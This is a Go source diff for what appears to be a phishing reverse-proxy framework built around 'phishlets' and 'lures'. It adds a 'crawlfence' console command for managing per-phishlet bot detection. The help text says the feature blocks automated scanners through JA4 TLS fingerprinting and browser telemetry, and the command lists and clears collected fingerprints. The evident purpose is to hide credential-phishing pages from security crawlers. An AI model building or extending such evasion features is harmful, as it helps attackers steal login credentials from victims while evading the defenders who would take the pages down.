@@ -178,6 +178,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("webhook: %v", err)
 			}
+		case "crawlfence":
+			cmd_ok = true
+			err := t.handleCrawlfence(args[1:])
+			if err != nil {
+				log.Error("crawlfence: %v", err)
+			}
 		case "test-certs":
 			cmd_ok = true
 			t.manageCertificates(true)
@@ -384,6 +390,79 @@ func (t *Terminal) handleWebhook(args []string) error {
 			return fmt.Errorf("webhook test failed: %v", err)
 		}
 		log.Success("webhook test successful")
+		return nil
+	}
+
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleCrawlfence(args []string) error {
+	pn := len(args)
+
+	if pn == 0 {
+		// Show overall crawlfence status
+		log.Info("crawlfence status for phishlets with crawlfence enabled:")
+		found := false
+		for name, pl := range t.cfg.phishlets {
+			if pl.Crawlfence != nil && pl.Crawlfence.Enabled {
+				found = true
+				ja4Mode := "off"
+				if pl.Crawlfence.JA4Config != nil {
+					ja4Mode = pl.Crawlfence.JA4Config.Mode
+				}
+				telemetry := "disabled"
+				if pl.Crawlfence.Telemetry != nil && pl.Crawlfence.Telemetry.Enabled {
+					telemetry = "enabled"
+				}
+				log.Printf("  %s: ja4=%s, telemetry=%s", name, ja4Mode, telemetry)
+			}
+		}
+		if !found {
+			log.Info("  no phishlets have crawlfence enabled")
+		}
+		return nil
+	}
+
+	switch args[0] {
+	case "ja4":
+		if pn < 2 {
+			return fmt.Errorf("usage: crawlfence ja4 <phishlet>|all")
+		}
+		phishlet := args[1]
+		records := t.p.crawlfence.GetJA4Stats(phishlet)
+		if len(records) == 0 {
+			log.Info("no JA4 signatures recorded for: %s", phishlet)
+			return nil
+		}
+		log.Info("JA4 signatures for: %s", phishlet)
+		cols := []string{"ja4", "count", "first_seen", "last_seen", "sample_ua"}
+		var rows [][]string
+		for _, r := range records {
+			ua := ""
+			if len(r.UserAgents) > 0 {
+				ua = r.UserAgents[0]
+				if len(ua) > 50 {
+					ua = ua[:50] + "..."
+				}
+			}
+			rows = append(rows, []string{
+				r.Signature,
+				strconv.Itoa(r.Count),
+				r.FirstSeen.Format("2006-01-02 15:04"),
+				r.LastSeen.Format("2006-01-02 15:04"),
+				ua,
+			})
+		}
+		log.Printf("\n%s\n", AsTable(cols, rows))
+		return nil
+
+	case "clear":
+		if pn < 2 {
+			return fmt.Errorf("usage: crawlfence clear <phishlet>|all")
+		}
+		phishlet := args[1]
+		t.p.crawlfence.ClearJA4Stats(phishlet)
+		log.Success("cleared JA4 learning data for: %s", phishlet)
 		return nil
 	}
 
@@ -1498,6 +1577,14 @@ TIP: Use 'lures get-url' with import/export for bulk URL generation.`, LAYER_TOP
 	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
 	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")
+
+	h.AddCommand("crawlfence", "general", "manage crawlfence bot detection", "Crawlfence detects and blocks automated scanners using JA4 TLS fingerprinting and browser telemetry. Configure crawlfence per-phishlet in YAML config.", LAYER_TOP,
+		readline.PcItem("crawlfence",
+			readline.PcItem("ja4", readline.PcItemDynamic(t.phishletPrefixCompleter), readline.PcItem("all")),
+			readline.PcItem("clear", readline.PcItemDynamic(t.phishletPrefixCompleter), readline.PcItem("all"))))
+	h.AddSubCommand("crawlfence", nil, "", "show crawlfence status for all phishlets")
+	h.AddSubCommand("crawlfence", []string{"ja4"}, "ja4 <phishlet>|all", "show collected JA4 signatures (learning mode)")
+	h.AddSubCommand("crawlfence", []string{"clear"}, "clear <phishlet>|all", "clear JA4 learning data")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
